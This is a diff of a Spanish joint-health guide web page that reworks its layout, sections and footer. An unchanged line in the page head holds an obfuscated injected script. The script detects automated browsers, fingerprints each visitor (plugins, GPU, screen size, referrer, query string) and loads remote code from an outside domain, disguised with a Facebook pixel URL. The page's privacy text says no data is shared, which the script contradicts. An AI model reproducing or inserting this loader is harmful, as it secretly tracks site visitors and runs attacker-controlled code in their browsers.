@@ -4,10 +4,10 @@
 <script>var HCVRMDJVJ=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="https://sp1.micenice.pro/kl/?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Guía Completa de Salud Articular - Cuida tus Articulaciones</title>
-    <meta name="description" content="Descubre consejos expertos para mantener tus articulaciones saludables, prevenir dolores y mejorar tu movilidad.">
-    <meta name="keywords" content="salud articular, articulaciones, dolor articular, ejercicio, nutrición, bienestar">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap">
+    <title>Articulaciones Saludables - Guía Completa para tu Bienestar</title>
+    <meta name="description" content="Descubre consejos expertos para mantener tus articulaciones fuertes y saludables. Información completa sobre cuidado articular.">
+    <meta name="keywords" content="articulaciones, salud, dolor articular, ejercicio, nutrición">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -30,141 +30,135 @@
             background-color: #2c3e50;
             color: white;
             text-align: center;
-            padding: 30px 0;
+            padding: 2rem 0;
         }
-        h1, h2 {
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        h2 {
             color: #2c3e50;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+            margin: 2rem 0 1rem;
         }
-        section {
+        .image-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        .image-container img {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            border-radius: 10px;
+            transition: transform 0.3s ease;
+        }
+        .image-container img:hover {
+            transform: scale(1.05);
+        }
+        .section {
             background-color: white;
-            margin: 20px 0;
-            padding: 30px;
-            border-radius: 8px;
+            padding: 2rem;
+            margin-bottom: 1rem;
+            border-radius: 10px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            margin: 15px 0;
+        .contact-form {
+            background-color: #f9f9f9;
+            padding: 2rem;
+            border-radius: 10px;
+        }
+        .contact-form input, 
+        .contact-form textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
         }
         .cookie-notice {
             position: fixed;
             bottom: 0;
             left: 0;
             width: 100%;
-            background-color: #2c3e50;
+            background-color: #333;
             color: white;
+            padding: 1rem;
             text-align: center;
-            padding: 15px;
             z-index: 1000;
-        }
-        form {
-            background-color: #f8f9fa;
-            padding: 30px;
-            border-radius: 8px;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        button {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 4px;
-            cursor: pointer;
         }
         @media (max-width: 768px) {
             .container {
                 width: 95%;
                 padding: 10px;
             }
-            section {
-                padding: 15px;
+            h1 {
+                font-size: 2rem;
             }
         }
     </style>
 </head>
 <body>
-    <header class="container">
-        <h1>Guía Definitiva de Salud Articular</h1>
-        <p>Descubre cómo cuidar y mantener tus articulaciones en óptimas condiciones</p>
+    <header>
+        <div class="container">
+            <h1>Articulaciones Saludables: Tu Guía Completa</h1>
+            <p>Descubre cómo cuidar y mantener tus articulaciones en óptimas condiciones</p>
+        </div>
     </header>
 
     <main class="container">
-        <section>
+        <section class="section">
             <h2>Introducción a la Salud Articular</h2>
-            <img src="images/chess1.jpg" alt="Salud articular">
-            <p>Las articulaciones son fundamentales para nuestra movilidad y calidad de vida. En esta guía completa, exploraremos estrategias integrales para mantenerlas saludables y prevenir problemas.</p>
+            <div class="image-container">
+                <img src="images/chess1.jpg" alt="Introducción articulaciones">
+                <img src="images/chess2.jpg" alt="Anatomía articular">
+            </div>
+            <p>Las articulaciones son fundamentales para nuestra movilidad y calidad de vida. Comprender su funcionamiento es clave para mantenerlas saludables.</p>
         </section>
 
-        <section>
-            <h2>Anatomía de las Articulaciones</h2>
-            <img src="images/chess2.jpg" alt="Anatomía articular">
-            <p>Comprender la estructura y función de nuestras articulaciones es el primer paso para su cuidado adecuado. Aprenderemos sobre los diferentes tipos de articulaciones y sus necesidades específicas.</p>
+        <section class="section">
+            <h2>Nutrición para Articulaciones Fuertes</h2>
+            <div class="image-container">
+                <img src="images/chess3.jpg" alt="Alimentos para articulaciones">
+                <img src="images/chess4.jpg" alt="Nutrición saludable">
+            </div>
+            <p>Una dieta balanceada rica en omega-3, calcio y vitamina D puede ayudar a fortalecer tus articulaciones.</p>
         </section>
 
-        <section>
-            <h2>Nutrición para Articulaciones Saludables</h2>
-            <img src="images/chess3.jpg" alt="Nutrición articular">
-            <p>La alimentación juega un papel crucial en la salud de tus articulaciones. Descubre los nutrientes esenciales y los alimentos que pueden prevenir la inflamación.</p>
+        <section class="section">
+            <h2>Ejercicios para Articulaciones Saludables</h2>
+            <div class="image-container">
+                <img src="images/chess5.jpg" alt="Ejercicios articulares">
+                <img src="images/chess6.jpg" alt="Movimientos saludables">
+            </div>
+            <p>Realizar ejercicios de bajo impacto puede mejorar la flexibilidad y reducir el dolor articular.</p>
         </section>
 
-        <section>
-            <h2>Ejercicios para Fortalecer las Articulaciones</h2>
-            <img src="images/chess4.jpg" alt="Ejercicios articulares">
-            <p>Ejercicios específicos pueden ayudar a mantener tus articulaciones fuertes y flexibles. Te presentamos rutinas seguras y efectivas.</p>
-        </section>
-
-        <section>
-            <h2>Prevención de Lesiones Articulares</h2>
-            <img src="images/chess5.jpg" alt="Prevención de lesiones">
-            <p>Aprende técnicas para evitar lesiones y sobreesfuerzos que puedan dañar tus articulaciones durante actividades diarias y deportivas.</p>
-        </section>
-
-        <section>
-            <h2>Tratamientos Naturales y Complementarios</h2>
-            <img src="images/chess6.jpg" alt="Tratamientos naturales">
-            <p>Explora remedios naturales, suplementos y terapias alternativas que pueden complementar el cuidado de tus articulaciones.</p>
-        </section>
-
-        <section>
-            <h2>Cuando Consultar a un Profesional</h2>
-            <img src="images/chess7.jpg" alt="Consulta médica">
-            <p>Identificamos las señales de alerta que indican que debes buscar atención médica especializada para tus articulaciones.</p>
-        </section>
-
-        <section>
-            <h2>Contacta con Nosotros</h2>
+        <section class="contact-form">
+            <h2>Contáctanos</h2>
             <form>
-                <h3>Formulario de Contacto</h3>
                 <input type="text" placeholder="Nombre" required>
                 <input type="email" placeholder="Correo Electrónico" required>
                 <textarea placeholder="Tu Mensaje" rows="5" required></textarea>
                 <button type="submit">Enviar Mensaje</button>
             </form>
         </section>
+
+        <section class="section">
+            <h2>Política de Privacidad</h2>
+            <p>Nos comprometemos a proteger tu información personal. No compartimos datos sin tu consentimiento.</p>
+        </section>
+
+        <section class="section">
+            <h2>Términos de Uso</h2>
+            <p>Al utilizar este sitio, aceptas nuestros términos y condiciones de uso.</p>
+        </section>
     </main>
 
-    <footer class="container">
-        <section>
-            <h2>Política de Privacidad</h2>
-            <p>En nuestro sitio web, nos comprometemos a proteger tu información personal. No compartimos datos con terceros y utilizamos métodos seguros de gestión de información.</p>
-        </section>
-
-        <section>
-            <h2>Términos de Uso</h2>
-            <p>Al utilizar este sitio web, aceptas nuestros términos de uso. La información proporcionada es solo con fines educativos y no sustituye el consejo médico profesional.</p>
-        </section>
-    </footer>
-
     <div class="cookie-notice">
-        Este sitio utiliza cookies para mejorar tu experiencia. Al continuar navegando, aceptas nuestra política de cookies.
+        Este sitio utiliza cookies para mejorar tu experiencia. <a href="#" style="color: #3498db;">Más información</a>
     </div>
 </body>
 </html>
